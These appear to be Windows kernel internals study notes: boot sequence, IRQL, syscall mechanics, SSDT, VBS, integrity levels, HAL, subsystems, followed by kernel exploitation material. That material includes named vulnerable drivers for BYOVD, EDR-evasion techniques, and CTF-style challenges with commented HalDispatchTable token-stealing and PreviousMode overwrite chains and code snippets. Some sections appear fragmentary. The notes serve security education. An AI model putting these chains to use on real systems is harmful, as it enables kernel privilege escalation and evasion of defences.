Overview

High-Level Component Map

The Two Layers Inside ntoskrnl.exe

The Kernel Layer (Ke prefix): Thread scheduling, Interrupt dispatching, DPC (Deferred Procedure Call) processing, Exception dispatching, Synchronization primitives, Trap handling

The Executive Layer (Ex, Ps, Mm, Io, Ob, Se, Cm, Cc, Po, Pp prefixes): Process Manager (Ps), Memory Manager (Mm), I/O Manager (Io), Object Manager (Ob), Security Reference Monitor (Se), Configuration Manager (Cm), Cache Manager (Cc), Power Manager (Po), Plug and Play Manager (Pp)

Boot Process

  1. UEFI: SEC, PEI, DXE phases
  2. BDS Phase: Boot Device Selection — find bootmgfw.efi
  3. bootmgfw.efi (Windows Boot Manager):
    • Reads BCD (Boot Configuration Data)
    • Validates Secure Boot signatures
    • Loads winload.efi (or winresume.efi for hibernate)
  4. winload.efi (Windows OS Loader):
    • Loads the SYSTEM registry hive
    • Loads ntoskrnl.exe, HAL.dll, boot-start drivers, CI.dll (Code Integrity)
    • Initializes the hypervisor if VBS is enabled
    • Transfers control to ntoskrnl.exe
  5. hal.dll specific:
    • Phase 0: HalInitSystem(0, ...) called very early during kernel init — Init APIC, scheduler timer, spinlocks, detect ACPI/UEFI
    • Phase 1: HalInitSystem(1, ...) called later — Complete ACPI table parsing, init DMA, performance counters
  6. ntoskrnl.exe Phase 0 initialization (KiInitializeKernel):
    • Initialize the kernel (scheduler, memory manager, object manager)
    • Security Reference Monitor initialization
    • PnP manager enumerates boot-start devices
  7. Phase 1 initialization (Phase1InitializationDiscard):
    • Start remaining executive subsystems
    • Launch smss.exe (Session Manager) — the first user-mode process

User vs. Kernel Mode

Ring 0 = Kernel Mode
Ring 3 = User Mode

Stored in two least-significant bits of CS register (CS.RPL)
Bit 2 of each page table entry is supervisor bit (1=ring0, 0=ring3)
Address spaces:
    User:   0x0000000000000000 - 0x00007FFFFFFFFFFF
    Kernel: 0xFFFF800000000000 - 0xFFFFFFFFFFFFFFFF

Kernel Pool Types:
    NonPagedPoolNx  — non-pageable, NX enforced (default post-Win8)
    NonPagedPool    — non-pageable, executable (legacy, avoid)
    PagedPool       — pageable (most allocations below APC_LEVEL)
    Segment Heap    — randomized layout, guard pages, metadata validation (Win10 20H1+)

!!! PreviousMode is a single byte that controls access checks → most powerful exploitation primitive

IRQL (Interrupt Request Levels)

Kernel priority mechanism — determines what can preempt what. Stored per-processor.

HIGH_LEVEL (31/15)     ← Bugcheck, NMI, machine check
POWER_LEVEL (30/14)    ← Power failure
IPI_LEVEL (29/13)      ← Inter-processor interrupt
CLOCK_LEVEL (28/13)    ← Clock interrupt
Device IRQLs (3–11)    ← Hardware device interrupts (DIRQL)
DISPATCH_LEVEL (2)     ← Thread scheduling, DPCs
APC_LEVEL (1)          ← Async Procedure Calls
PASSIVE_LEVEL (0)      ← Normal thread execution

Rules:

  • Running at IRQL N → all interrupts ≤ N are masked
  • ≥ DISPATCH_LEVEL: cannot access pageable memory (IRQL_NOT_LESS_OR_EQUAL BSOD), cannot block/wait on dispatcher objects
  • Most driver code runs at PASSIVE_LEVEL. ISRs run at DIRQL. DPCs run at DISPATCH_LEVEL
  • KeRaiseIrql / KeLowerIrql — never lower below the level you entered at
  • Cannot allocate paged pool at ≥ DISPATCH_LEVEL

Nt* vs Zw*

  • Nt* functions (e.g., NtCreateFile):
    • When called from user mode (KTHREAD.PreviousMode = 1) → checks permissions
    • When called from kernel mode (KTHREAD.PreviousMode = 0) → also checks permissions (the caller might be a driver acting on behalf of a user)
  • Zw* functions (e.g., ZwCreateFile): Set KTHREAD.PreviousMode = 0 before calling the Nt* function. This bypasses user-mode access checks. Intended for kernel-mode callers that need to access objects with kernel-level privileges

User-mode stub (ntdll!NtCreateFile, for example):

mov eax, 0x55         ; System call number (SSN) for NtCreateFile
syscall               ; Transfer to kernel
ret

SYSCALL instruction executes:

  • CPU loads RIP from IA32_LSTAR MSR (→ KiSystemCall64)
  • CPU loads CS from IA32_STAR MSR bits 47:32 (kernel CS)
  • CPU masks RFLAGS with IA32_FMASK MSR (disables interrupts)
  • CPU saves return address in RCX, saves RFLAGS in R11

KiSystemCall64 in the kernel:

  • Saves user-mode register state on kernel stack (KTRAP_FRAME)
  • Swaps GS base (user GS ↔ kernel GS) — swapgs
  • Looks up table base offset using the system call number in the System Service Descriptor Table (SSDT)
  • Calls the target function (e.g., nt!NtCreateFile)

SYSRET mechanics:

  • CPU loads RIP from RCX, loads RFLAGS from R11
  • CPU sets CPL to 3 (user mode)
  • Result in RAX

System Service Descriptor Table (SSDT)

  • KeServiceDescriptorTable: ntoskrnl system call table only
  • KeServiceDescriptorTableShadow: ntoskrnl AND win32k.sys (GDI/USER) system call tables
  • GUI threads use the Shadow table; non-GUI threads use the regular table
  • The table is read-only on x64 systems
  • System call numbers change between Windows builds — they are not stable ABI. This is intentional: it forces user-mode code to go through ntdll.dll rather than hardcoding syscall numbers

The Secure Kernel (VTL 1)

With Virtualization-Based Security (VBS), Windows introduces a third execution context:

┌────────────────────────────────────────────────────┐
│                  Hypervisor (Ring -1)               │
├──────────────────────┬─────────────────────────────┤
│   VTL 0 (Normal)     │    VTL 1 (Secure World)     │
│                      │                             │
│  ntoskrnl.exe        │  securekernel.exe           │
│  Drivers             │  Credential Guard           │
│  User applications   │  (lsaiso.exe — isolated     │
│                      │   LSA process)              │
│                      │  HVCI enforcement           │
│                      │  Secure enclaves            │
├──────────────────────┴─────────────────────────────┤
│                    Hardware                         │
└────────────────────────────────────────────────────┘
  • VTL 0 (Virtual Trust Level 0): The normal Windows kernel and user mode. This is what you see without VBS
  • VTL 1 (Virtual Trust Level 1): The secure kernel. Even if VTL 0 kernel is fully compromised, VTL 1 secrets (like Credential Guard-protected credentials) remain safe because the hypervisor prevents VTL 0 from accessing VTL 1 memory
  • The hypervisor enforces VTL memory permissions via SLAT (Second Level Address Translation) / EPT (Extended Page Tables)

User-Mode Security Boundaries

Session Isolation

  • Each logon session has its own window station and desktop — processes in different sessions cannot send window messages to each other
  • Session 0 isolation (Vista+): Services run in Session 0; interactive users in Session 1+

Mandatory Integrity Control (MIC)

Integrity LevelSIDWho Runs Here
UntrustedS-1-16-0Almost nothing
LowS-1-16-4096Protected Mode IE, sandboxed processes
MediumS-1-16-8192Standard user processes
HighS-1-16-12288Elevated (admin) processes
SystemS-1-16-16384SYSTEM services, kernel-initiated processes
  • A process at a lower integrity level cannot write to objects at a higher integrity level (no write up)
  • A process at a lower integrity level cannot read objects labeled "no read up"
  • UAC prompt moves a process from Medium to High integrity

AppContainer Isolation

Strongest user-mode sandbox (used by UWP apps, Edge, sandboxed browser tabs):

  • AppContainer processes have a unique AppContainer SID and a set of Capabilities
  • Default deny: An AppContainer process cannot access ANY resource unless explicitly granted
  • Cannot access the network without the internetClient capability
  • Cannot access the file system outside its own package folder without broker mediation
  • Cannot access other processes, registry keys, or named objects unless they explicitly grant access to the AppContainer SID

Protected Processes (PP / PPL)

Prevents administrators from opening a process with full access:

Protection LevelSignerExamples
PsProtectedSignerWinTcb-LightWindows TCBcsrss.exe, smss.exe
PsProtectedSignerWindows-LightWindowsservices.exe

  • A process can only be opened with PROCESS_ALL_ACCESS by a process with equal or higher protection level
  • This protects LSASS from credential dumping (Mimikatz) — unless the attacker has kernel access or a vulnerable signed driver
  • The protection level is stored in EPROCESS.Protection

HAL

Overview

  • hal.dll is a kernel-mode module that sits between the NT kernel (ntoskrnl.exe) and the physical hardware to abstract away platform-specific hardware details into portable APIs
  • Loaded during boot by winload.efi, mapped into the kernel address space, and runs in Ring 0
  • Base hal.dll provides the common framework and loads HAL Extensions (.dll files loaded by the HAL to provide platform-specific functionality)
    • Example: HalExtIntcLpioDMA.dll (Intel Low Power DMA)
  • ACPI tables (MADT, FADT, DSDT, SSDT, etc.) and UEFI Runtime Service Wrappers (GetTime, SetTime, GetVariable, SetVariable)
  • HAL Heap: separate from kernel pools, used for HAL extension data, adapter objects, and DMA mapping structures

HAL Internals

HalDispatchTable

A function pointer table used by the kernel to call HAL functions. Structure:

typedef struct _HAL_DISPATCH {
    ULONG Version;
    pHalQuerySystemInformation HalQuerySystemInformation;    // +0x8 — classic exploit target
    pHalSetSystemInformation HalSetSystemInformation;        // +0x10
    pHalQueryBusSlots HalQueryBusSlots;                      // +0x18
    // ... more entries
} HAL_DISPATCH, *PHAL_DISPATCH;

Exploitation history: Overwriting HalDispatchTable+0x8 with a controlled address, then triggering a call to NtQueryIntervalProfile → KeQueryIntervalProfile → HalDispatchTable.HalQuerySystemInformation → attacker's code. This was one of the most common kernel EoP primitives for years until PatchGuard and SMEP mitigations made it harder.

HalPrivateDispatchTable

Additional function pointers for internal HAL operations. Less documented, occasionally targeted.

ADAPTER_OBJECT

Represents a DMA adapter for a device. Contains scatter/gather capabilities, DMA channel info, IOMMU domain assignment.

Subsystems

Overview

  1. Native API (ntdll.dll): The lowest-level user-mode API that provides ~460 system call stubs (Nt* functions) plus runtime library functions (Rtl*). All subsystems ultimately call through ntdll.dll
    • Ldr* (DLL Loader) functions: maps EXE and DLLs to memory and maintains three module lists in the PEB (InLoadOrderModuleList, InMemoryOrderModuleList, InInitializationOrderModuleList)
  2. Environment Subsystem Process: Each subsystem has a server process that runs in user mode and manages state for its client applications:
    • Win32: csrss.exe (Client/Server Runtime Subsystem)
    • POSIX: psxss.exe (removed)
    • OS/2: os2ss.exe (removed)
  3. Subsystem DLLs: Each subsystem provides DLLs that applications link against. These DLLs translate the subsystem's API into Native API calls:
    • Win32: kernel32.dll, user32.dll, gdi32.dll, advapi32.dll
    • POSIX: psxdll.dll (removed)
  4. ALPC (Advanced Local Procedure Call): The IPC mechanism subsystem DLLs use to communicate with their subsystem server process (e.g. a Win32 app calls certain APIs that are passed to csrss.exe for processing via ALPC)
    • Server controls who can connect. Enables impersonation — the server can impersonate the client's security context (token). Used by Windows task scheduler.
  5. Subsystem Hardening: DisallowWin32kSystemCalls (no win32k syscalls), Server Core / Nano Server (no win32kfull.sys loaded), AppContainer + win32k filtering, Constrained Language Mode (PowerShell)

Win32 Subsystem

  • Primary and mandatory subsystem
  • API Sets: allows Microsoft to refactor DLL internals without breaking application compatibility
    • Application imports from api-ms-win-core-file-l1-1-0.dll
    • Loader resolves this to the actual implementing DLL (kernelbase.dll)
    • Mapping is stored in the ApiSetSchema (data structure in PEB, loaded from apisetschema.dll)

csrss.exe

  • One instance per session (Session 0 has its own, each interactive session has its own)
  • Runs as PPL (Protected Process Light) with WinTcb signer level
  • Console window management: Creates and manages console windows for command-line applications. Console hosting was partially moved to conhost.exe (Vista+) and more recently to Windows Terminal
  • Process/thread creation notifications: The kernel notifies CSRSS when processes and threads are created/terminated (CSRSS maintains internal bookkeeping)
  • Shutdown management: CSRSS sends WM_QUERYENDSESSION and WM_ENDSESSION to all top-level windows during shutdown
  • Hard error handling: Displays "Application Error" dialog boxes for unhandled exceptions
  • DOS device mapping: Maintains per-session \DosDevices namespace (drive letters, named pipes, etc.)

win32k.sys

  • Runs in kernel mode
  • Window Manager (USER): Window creation, message queuing/dispatching, input (keyboard/mouse), menus, hooks, clipboard
  • GDI (Graphics Device Interface): Drawing primitives (lines, rectangles, text, bitmaps, regions, paths), font rendering, device contexts, print spooling interface
  • DirectComposition: Modern composition engine for DWM (Desktop Window Manager)
  • Architecture (win32k.sys is split into):
    • win32kbase.sys: Core functionality (shared between full and Nano Server)
    • win32kfull.sys: Full window manager and GDI (loaded on full desktop SKUs)
    • win32kmin.sys: Minimal stub (on Nano Server / Server Core without desktop)
  • Kernel-mode conversion callbacks: When win32k.sys needs to call back into user mode, it uses KeUserModeCallback (kernel → user mode mid-syscall and returns)

Windows Subsystem for Linux (WSL)

WSL 1 (Translation Layer)

  • Is a true subsystem: translates Linux system calls to NT kernel calls
  • Pico processes: introduced for WSL1 and are minimal processes managed by a pico provider (lxcore.sys driver) rather than the Win32 subsystem. The kernel dispatches system calls from pico processes to the registered pico provider instead of the SSDT. They're subject to Windows security (tokens, ACLs, integrity levels) but can also interact with the Windows filesystem and processes
  • System call translation: e.g. lxcore.sys translates fork() → NtCreateProcess
  • VFS (Virtual File System):
    • VolFs: Maps Linux root filesystem to a Windows directory (Linux metadata like perms + symlinks stored in NTFS extended attributes)
    • DrvFs: Maps Windows drives like /mnt/c
    • Procfs, Sysfs, Tmpfs: Emulated in-memory filesystems
  • ELF loader: The kernel (via lxcore.sys) directly loads and executes ELF binaries (no PE conversion)
  • Signal handling: Linux signals are mapped to and from NT's exception/APC mechanisms

WSL 2 (Lightweight VM)

  • Runs a real Linux kernel built by Microsoft in a lightweight utility Hyper-V VM (isolated by the hypervisor = stronger isolation)
  • 9P protocol: Linux FS /mnt/c uses Plan 9 File Protocol (9P) to access Windows drives
  • ext4 root fs: stored in a .vhdx file

Session Manager (smss.exe)

First user-mode process launched by the kernel. Session isolation prevents cross-session attacks since each session has its own window station namespace (\Sessions\<N>\Windows).

Responsible for:

  1. Creating environment variables from registry
  2. Loading the initial \KnownDlls section objects
  3. Creating paging files
  4. Launching autochk.exe (if disk check needed)
  5. Creating Session 0 (services session) and Session 1 (first interactive session)
  6. Launching csrss.exe and wininit.exe (Session 0) or csrss.exe and winlogon.exe (interactive sessions)
  7. Acting as the parent of all subsequent CSRSS instances

Common Kernel Vulnerability Classes

  • Use-After-Free (UAF): win32k objects freed during user-mode callback, kernel still holds stale pointer
  • Pool buffer overflow: integer overflow → small allocation → write past boundary
  • Type confusion: wrong object type passed/cast, fields misinterpreted
  • Race conditions (TOCTOU): user-mode changes data between kernel's check and use
  • Uninitialized memory: kernel stack/pool data leaked to user mode (info disclosure)
  • Missing ProbeForRead/Write: kernel trusts user-supplied pointer without validating it's in user space → arbitrary kernel read/write
  • Double fetch: kernel reads user memory twice — attacker modifies between reads

Exploitation Primitives (Chaining Steps)

1. Info Leak          → Defeat KASLR (find ntoskrnl base)
2. Arbitrary Write    → Overwrite token pointer, security descriptor, or PreviousMode
3. Privilege Escalation:
   Option A: Token Stealing    — copy SYSTEM token → attacker's EPROCESS.Token
   Option B: PreviousMode      — set KTHREAD.PreviousMode = 0 → bypass all access checks
   Option C: ACL Overwrite     — null out security descriptor → unrestricted access

BYOVD (Bring Your Own Vulnerable Driver)

  • Load a legitimately signed but vulnerable driver → exploit its IOCTL for kernel read/write
  • Common targets: dbutil_2_3.sys (Dell), RTCore64.sys (MSI), capcom.sys, gdrv.sys (Gigabyte)
  • Defense: Microsoft vulnerable driver blocklist, HVCI, WDAC driver file rules

Direct Syscall / EDR Evasion

  • EDR products hook ntdll.dll in user mode to monitor API calls
  • Bypass: call SYSCALL directly with extracted SSN, bypassing hooked ntdll
  • Tools/techniques: SysWhispers, HellsGate, Halo's Gate, manual ntdll mapping from disk
  • Defense: kernel-mode ETW (EtwTi — Threat Intelligence), kernel callbacks, minifilter drivers

#   Arg1: FFFFF80123456000    (address accessed)
#   Arg2: 00000002             (IRQL at time of fault)
#   Arg3: 00000000             (read operation)
#   Arg4: FFFFF80198765432    (faulting instruction)
#
# The faulting instruction is in a DPC routine.
# Arg1 is a paged pool allocation address.

Challenge 3: HAL Dispatch Exploitation (Historical)

Hard

Given a Windows 7 kernel memory dump (no SMEP, no PatchGuard integrity check on HalDispatchTable), construct the exploitation chain to achieve EoP via HalDispatchTable overwrite.

// Exploitation steps (Windows 7 x64, pre-SMEP):
// 1. Leak kernel base via NtQuerySystemInformation(SystemModuleInformation)
// 2. Calculate HalDispatchTable address: kernel_base + offset
// 3. Use arbitrary write primitive to overwrite HalDispatchTable+0x8
//    with address of user-mode payload
// 4. Payload: token-stealing shellcode
//    - Find current EPROCESS via gs:[0x188] → KTHREAD → EPROCESS
//    - Walk ActiveProcessLinks to find PID 4 (System)
//    - Copy System token to current process
// 5. Trigger: call NtQueryIntervalProfile()
//    → KeQueryIntervalProfile() → HalDispatchTable[1]() → shellcode
// 6. Spawn cmd.exe — now running as SYSTEM

typedef NTSTATUS (*pNtQueryIntervalProfile)(ULONG, PULONG);
pNtQueryIntervalProfile NtQIP = GetProcAddress(
    GetModuleHandleA("ntdll.dll"), "NtQueryIntervalProfile");

// After overwriting HalDispatchTable+0x8:
ULONG dummy;
NtQIP(2, &dummy);  // Triggers call to our shellcode
// FLAG{HalDispatch_token_steal_EoP}

The classic chain: (1) Info leak to defeat KASLR and find ntoskrnl base. (2) Arbitrary write — from a pool overflow, use-after-free, or driver IOCTL vulnerability. (3) Overwrite HalDispatchTable+0x8 with user-mode shellcode address. (4) Trigger via NtQueryIntervalProfile(2, &dummy). On modern systems, SMEP prevents executing user-mode code from Ring 0, PatchGuard detects the table modification, and HVCI prevents allocating executable memory in kernel space.

Challenge 6: Decode the SSDT Entry

# WinDbg output:
# nt!KiServiceTable:
#   0x00: 0x04106C00
#   0x55: 0x042A8504
#
# x64 SSDT entries encode: offset = entry >> 4
# Actual address = KiServiceTable + offset
# Number of stack params = entry & 0xF
#
# Given nt!KiServiceTable at 0xFFFFF805`41200000:
# Entry 0x55 = 0x042A8504

Challenge 10: PreviousMode Exploitation

Hard

Given an arbitrary kernel write primitive, explain how setting KTHREAD.PreviousMode = 0 turns NtReadVirtualMemory/NtWriteVirtualMemory into arbitrary kernel R/W. Flag: the KTHREAD offset for PreviousMode on Win11 22H2.

# PreviousMode exploitation chain:
# 1. Find current KTHREAD address: gs:[0x188] in kernel mode
# 2. Overwrite KTHREAD.PreviousMode from 1 (UserMode) to 0 (KernelMode)
# 3. Now NtReadVirtualMemory / NtWriteVirtualMemory skip access checks
# 4. Read/write ANY kernel address from user mode!
#
# WinDbg: find the offset
# dt nt!_KTHREAD PreviousMode
# Typical offset: 0x232 (varies by build)
#
# After setting PreviousMode = 0:
NtReadVirtualMemory(GetCurrentProcess(),
    (PVOID)0xFFFFF80541200000,  // kernel address!
    buffer, 0x1000, NULL);      // succeeds!

PreviousMode is a single byte in KTHREAD that tells the kernel whether the current syscall originated from user mode (1) or kernel mode (0). When it's 0, Nt* functions skip ProbeForRead/ProbeForWrite checks and accept kernel addresses. This is the most powerful data-only exploitation primitive — it doesn't require code execution in kernel, just a single byte write. Offset varies: use dt nt!_KTHREAD PreviousMode in WinDbg for your build.
